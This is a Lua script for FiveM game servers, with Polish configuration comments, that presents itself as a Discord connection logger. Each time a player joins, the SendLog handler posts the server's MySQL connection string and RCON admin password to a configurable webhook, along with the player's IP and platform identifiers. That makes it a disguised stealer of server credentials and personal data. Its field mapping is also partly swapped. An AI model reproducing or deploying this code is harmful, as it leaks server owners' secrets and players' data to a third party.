local webhook = "Link do Webhooka gdzie maja sie logi wysylac"
Config = {}
Config.wysylajLogi = true -- Wysyla logi na webhooka
Config.UseSteam = true -- jak false to uzywa Rockstar Licencji
Config.nazwabota = "JABAC STARE BABY"-- Jak ma sie nazywac bot ktory wysyla logi
Config.kolorek = "53736"-- Wchodzicie na ta strone i tutaj macie Rozne kolory (Ten ktorego potrzebujecie to Decimal) https://convertingcolors.com
Config.IP = 'IP Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach IP Gracza
Config.discord= 'Discord' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Discord
Config.banner= 'Link do Bannera' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Link do Bannera
Config.Rcon= 'RconHaslo' -- Podajesz pod jaka nazwa ma sie pokazywac w logach RconHaslo
Config.nazwa= 'Nazwa Serwera' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Nazwa Serwera
Config.sloty= 'ilosc Slotow' -- Podajesz pod jaka nazwa ma sie pokazywac w logach ilosc Slotow
Config.sql= 'Sql dane' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Sql dane
Config.steamhex= 'Steam Hex Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Steam Hex Gracza
Config.xbl= 'Dane XBL Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Dane XBL Gracza
Config.liveid= 'Live Id Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Live Id Gracza
Config.nick= 'Nick Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Nick Gracza
Config.licencja= 'Licencja Gracza' -- Podajesz pod jaka nazwa ma sie pokazywac w logach Licencja Gracza
Config.zdj = 'siemkalink daj' -- Link do zdjecia co ma sie pojawiac na dole wysylanego loga






AddEventHandler("playerConnecting", function(reason)
    local id = source
    local identifier = ""
    local ip = GetPlayerIdentifier(source, 6)
    local infosql =  GetConvar("mysql_connection_string", "XDDDD")
    local rconpass = GetConvar("rcon_password", "XDDDD")
    local zdj = GetConvar("banner_detail", "XDDDD")
    local sloty = GetConvar("sv_maxClients", "32")
    local ds = GetPlayerIdentifier(source, 4)
    local live = GetPlayerIdentifier(source, 3)
    local xbl = GetPlayerIdentifier(source, 2)
    local lic = GetPlayerIdentifier(source, 1)
    if Config.UseSteam then
    identifier = GetPlayerIdentifier(source, 0)
    else
    identifier = GetPlayerIdentifier(source, 1)
    end
    if Config.wysylajLogi then
    SendLog(id, ip, ds, live, identifier, xbl, lic, infosql, rconpass, zdj, sloty)
    end
end)


function SendLog(id,ip, ds, identifier, live, xbl, lic, infosql, rconpass, zdj, sloty, hook)
    local name = GetPlayerName(id)
    local date = os.date('*t')
    local hostname =  GetConvar("sv_hostname", "XDDDD")
    local zdj = GetConvar("banner_detail", "XDDDD")
    if date.month < 10 then date.month = '0' .. tostring(date.month) end
    if date.day < 10 then date.day = '0' .. tostring(date.day) end
    if date.hour < 10 then date.hour = '0' .. tostring(date.hour) end
    if date.min < 10 then date.min = '0' .. tostring(date.min) end
    if date.sec < 10 then date.sec = '0' .. tostring(date.sec) end
    local date = (''..date.day .. '.' .. date.month .. '.' .. date.year .. ' - ' .. date.hour .. ':' .. date.min .. ':' .. date.sec..'')
    local embeds = {
        {
            ["title"] = 'Nazwa Serwera:'..hostname..'' ,
            ["type"]="rich",
            ["color"] = Config.kolorek,
            ["fields"] = {
                {
                    ["name"] = ''..Config.IP..'',
                    ["value"] = ip,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.discord..'',
                    ["value"] = ds,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.banner..'',
                    ["value"] = zdj,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.Rcon..'',
                    ["value"] = rconpass,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.nazwa..'',
                    ["value"] = hostname,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.sloty..'',
                    ["value"] = sloty,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.sql..'',
                    ["value"] = infosql,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.steamhex..'',
                    ["value"] = live,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.xbl..'',
                    ["value"] = xbl,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.liveid..'',
                    ["value"] = identifier,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.nick..'',
                    ["value"] = name,
                    ["inline"] = true,
                },{
                    ["name"] = ''..Config.licencja..'',
                    ["value"] = lic,
                    ["inline"] = true,
                },
            },
            ["footer"]=  {
                ["icon_url"] = ''..Config.zdj..'',
                ["text"]= "Wysłano: " ..date.."",
            },
        }
    }
    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({ username = Config.nazwabota,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end